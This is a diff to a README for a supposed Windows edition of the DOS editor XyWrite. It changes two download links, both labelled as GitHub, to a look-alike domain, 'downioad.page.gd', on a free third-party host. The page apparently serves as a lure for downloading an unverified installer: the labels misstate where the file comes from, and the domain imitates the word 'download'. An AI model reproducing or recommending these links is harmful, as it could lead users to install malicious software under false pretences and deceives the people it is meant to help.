@@ -2,7 +2,7 @@
 
 XyWrite is a legendary DOS-based text editor renowned for its keyboard-driven efficiency and minimalist design. The XyWrite Classic Writing Tools Suite brings this classic experience to modern Windows desktops, providing a seamless bridge between retro computing and contemporary workflows. This suite enhances XyWrite with updated features and compatibility, making it ideal for writers, programmers, and enthusiasts who appreciate timeless tools.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -46,7 +46,7 @@ A: Yes, during installation, select the portable option to create a standalone v
 
 ## Download
 
-[Get the latest version from GitHub](https://download-page.page.gd/)
+[Get the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
